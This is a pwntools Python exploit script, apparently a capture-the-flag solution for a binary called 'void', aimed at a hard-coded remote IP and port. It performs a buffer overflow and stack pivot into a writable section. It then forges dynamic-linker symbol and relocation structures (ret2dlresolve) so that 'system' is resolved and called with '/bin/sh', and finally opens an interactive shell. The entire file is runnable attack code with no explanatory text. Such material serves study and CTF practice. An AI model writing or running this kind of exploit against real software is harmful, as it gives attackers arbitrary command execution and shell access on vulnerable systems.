#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./void',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*vuln+32
                ''')
                input()

if args.REMOTE:
        p = remote('178.62.9.10',31314)
else:
        p = process(exe.path)

leave_ret = 0x0000000000401141
pop_rbp = 0x0000000000401109
pop_rdi = 0x00000000004011bb
pop_rsi_r15 = 0x00000000004011b9
rw_section = 0x404a00


#stack pivot
payload = b"a"*64
payload += p64(rw_section)
payload += p64(pop_rsi_r15) + p64(rw_section) + p64(0)
payload += p64(exe.plt['read'])
payload += p64(leave_ret)

p.send(payload)

JMPREL = 0x400430
SYMTAB = 0x400330
STRTAB = 0x400390
link_map = 0x0000000000401020

SYMTAB_addr = 0x404a40
JMPREL_addr = 0x404a68
STRTAB_addr = 0x404a78

symbol_number = int((SYMTAB_addr - SYMTAB)/24)
reloc_arg = int((JMPREL_addr - JMPREL)/24)
st_name = STRTAB_addr - STRTAB

log.info("symbol_number: " + hex(symbol_number))
log.info("reloc_arg: " + hex(reloc_arg))
log.info("st_name: " + hex(st_name))

st_info = 0x12
st_other = 0
st_shndx = 0
st_value = 0
st_size = 0

SYMTAB_struct = p32(st_name) #0x404a40
SYMTAB_struct += p8(st_info)
SYMTAB_struct += p8(st_other)
SYMTAB_struct += p16(st_shndx)
SYMTAB_struct += p64(st_value) #0x404a48
SYMTAB_struct += p64(st_size) #0x404a50

r_offset = exe.got['read']
r_info = (symbol_number << 32) | 7
r_addend = 0
JMPREL_struct = p64(r_offset) #0x404a68
JMPREL_struct += p64(r_info) #0x404a70

payload = flat(
    b'A'*8,        #a00 #padding
    pop_rsi_r15,   #a08
    0, 0,          #a10 #a18
    pop_rdi,       #a20
    0x404a80,      #a28 #string /bin/sh
    link_map,      #a30 #link_map
    reloc_arg,     #a38 #reloc_arg
    SYMTAB_struct, #a40 #a48 #a50
    0, 0,          #a58 #a60 #padding
    JMPREL_struct, #a68 #a70
    b'system\0\0', #a78
    b'/bin/sh\0'   #a80
)

p.send(payload)

p.interactive()
